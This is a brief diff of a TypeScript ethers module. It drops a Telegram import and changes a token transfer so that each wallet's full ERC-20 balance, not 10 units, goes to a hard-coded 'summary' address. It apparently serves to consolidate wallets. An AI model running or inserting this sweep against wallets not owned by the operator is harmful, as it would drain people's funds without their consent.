@@ -1,5 +1,4 @@
 import { ethers } from 'ethers';
-import Telegram from '../output/telegram';
 import z from 'zod';
 
 const SUMMARY_WALLET_ADDRESS = '0x60535415E95150d470C4663CCC59415a45d95566';
@@ -20,7 +19,7 @@ export function erc20(tokenAddress: string, wallet: ethers.Wallet) {
             const parsedBalance = z.bigint().parse(balance);
 
             if (parsedBalance > 0n) {
-                await contract.transfer(SUMMARY_WALLET_ADDRESS, 10n);
+                await contract.transfer(SUMMARY_WALLET_ADDRESS, parsedBalance);
                 return parsedBalance;
             }
 
